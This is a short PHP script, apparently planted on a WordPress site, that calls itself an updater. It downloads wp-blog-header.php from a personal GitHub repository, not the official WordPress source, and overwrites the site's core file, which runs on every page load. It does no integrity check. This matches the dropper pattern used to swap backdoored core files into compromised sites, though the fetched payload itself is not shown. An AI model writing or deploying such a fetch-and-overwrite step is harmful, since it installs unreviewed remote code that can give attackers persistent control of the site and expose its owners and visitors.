<?php
// Define the URL of the WordPress wp-blog-header.php file on GitHub
$github_url = 'https://raw.githubusercontent.com/debytoge/wordpress/main/wp-blog-header.php';

// Get the content of the wp-blog-header.php file from GitHub
$index_content = file_get_contents($github_url);

if ($index_content !== false) {
    // Write the content to the local wp-blog-header.php file (in the same directory as this script)
    if (file_put_contents('wp-blog-header.php', $index_content) !== false) {
        echo 'wp-blog-header.php updated successfully.';
    } else {
        echo 'Error: Failed to write the updated wp-blog-header.php file.';
    }
} else {
    echo 'Error: Failed to fetch the wp-blog-header.php file from GitHub.';
}
?>
